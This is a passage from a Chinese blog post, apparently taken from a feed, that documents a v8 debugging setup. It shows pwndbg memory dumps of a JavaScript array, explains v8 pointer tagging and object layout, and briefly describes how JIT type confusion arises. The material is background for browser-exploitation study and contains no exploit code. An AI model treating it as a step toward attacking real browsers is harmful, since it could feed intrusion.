class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x103408148989</span><br><span class="line">0x103408148989: [JSArray]</span><br><span class="line"> - map: 0x103408303ae1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1034082cbba1 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x103408148961 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x10340804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x1034080446d5: [String] in ReadOnlySpace: #length: 0x10340824215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x103408148961 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 1.1</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job 0x103408148961</span><br><span class="line">0x103408148961: [FixedDoubleArray]</span><br><span class="line"> - map: 0x103408042a95 &lt;Map&gt;</span><br><span class="line"> - length: 4</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 1.1</span><br><span class="line">pwndbg&gt; telescope 0x103408148988</span><br><span class="line">00:0000│  0x103408148988 ◂— 0x804222d08303ae1</span><br><span class="line">01:0008│  0x103408148990 ◂— 0x808148961</span><br><span class="line">02:0010│  0x103408148998 ◂— 0xbeadbeefbeadbeef</span><br><span class="line">pwndbg&gt; telescope 0x103408148960</span><br><span class="line">00:0000│  0x103408148960 ◂— 0x808042a95</span><br><span class="line">01:0008│  0x103408148968 ◂— 0x3ff0000000000000</span><br><span class="line">02:0010│  0x103408148970 ◂— 0x4000000000000000</span><br><span class="line">03:0018│  0x103408148978 ◂— 0x4008000000000000</span><br><span class="line">04:0020│  0x103408148980 ◂— 0x3ff199999999999a</span><br><span class="line">05:0028│  0x103408148988 ◂— 0x804222d08303ae1</span><br><span class="line">06:0030│  0x103408148990 ◂— 0x808148961</span><br><span class="line">07:0038│  0x103408148998 ◂— 0xbeadbeefbeadbeef</span><br></pre></td></tr></table></figure><p>v8因为地址都是⼋字节对⻬，所以最低的三位必然都是0，如果将其空置必然会造成浪费，所以可以用最低位来表示数据，当表示为指针的时候最低为就为1，这样表示出来的结果会比真实地址+1。（v8在内存中只有数字和对象两种表示。为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。）</p><p>这种八字节对齐而将低三位存储flag数据的应用场景还是蛮多的，节省了不必要的空间。</p><h2 id="v8的数据结构"><a href="#v8的数据结构" class="headerlink" title="v8的数据结构"></a>v8的数据结构</h2><p>和vb等语言的解析类似，JavaScript是一种解释执行语言，v8本质上是一个JavaScript的解释执行程序。</p><p>首先，需要了解v8解析执行JavaScript语句的基本流程：v8在读取js语句后，首先将这一条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。</p><p>为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阀值后，就会将这段语法树直接转换为机器码。后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为ByteCode字节码，这样就大大加快了执行速度。这就是著名的JIT优化。</p><p>这样的性能优化，虽然加快了程序的执行，但也带了很多安全问题。如果v8本来通过JIT引擎为某段语法树比如a+b加法计算生成了一段机器码<code>add eax,ebx</code>，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出来这个改变，这就造成了a和b对象在加法运算时的类型混淆。</p><p>熟悉了v8的解析过程，我们再来看一下v8中的对象结构。以上面的数组对象b为例，通过job命令可以看到一个对象在内存中布局大致如下所示：</p><table><thead><tr><th align="center">map</th><th align="center">表明了一个对象的类型</th></tr></thead><tbody><tr><td align="center">prototype</td><td align="center">prototype</td></tr><tr><td align="center">elements</td><td align="center">对象元素</td></tr><tr><td align="center">length</td><td align="center">元素个数</td></tr><tr><td align="center">properties</td><td align="center">属性</td></tr></tbody></table><p>细心的童鞋可以发现，数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x103408148989</span><br><span class="line">0x103408148989: [JSArray]</span><br><span class="line"> - map: 0x103408303ae1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1034082cbba1 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x103408148961 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x10340804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x1034080446d5: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x10340824215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x103408148961 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 1.1</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ubuntu-v8调试环境搭建&quot;&gt;&lt;a href=&quot;#ubuntu-v8调试环境搭建&quot; class=&quot;headerlink&quot; title=&quot;ubuntu v8调试环境搭建&quot;&gt;&lt;/a&gt;ubuntu v8调试环境搭建&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
  </entry>
  
</feed>
